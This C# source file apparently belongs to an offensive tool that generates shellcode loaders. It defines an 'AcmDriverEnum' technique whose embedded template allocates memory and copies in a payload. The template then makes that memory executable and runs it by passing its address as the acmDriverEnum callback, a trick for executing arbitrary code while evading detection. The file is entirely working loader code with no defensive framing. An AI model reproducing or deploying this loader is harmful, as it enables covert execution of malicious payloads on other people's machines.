using SingleDose.Techniques;
using System.Collections.Generic;

namespace PoisonTendy.Techniques.Loaders
{
    internal class AcmDriverEnum : ITechnique
    {
        bool ITechnique.IsLoader => true;

        bool ITechnique.IsUnsafe => false;

        string ITechnique.TechniqueName => "AcmDriverEnum";

        string ITechnique.TechniqueDescription => null;

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";

        List<string> ITechnique.TechniqueReferences => new List<string>() {
            @"https://github.com/Wra7h/FlavorTown"
        };

        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc", "AcmDriverEnum" };

        List<string> ITechnique.Prerequisites => null;

        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}
            acmDriverEnum(hAlloc, 0, 0);
        }
        {{ARGS}}
        {{INVOKE}}
    }
}";
    }
}
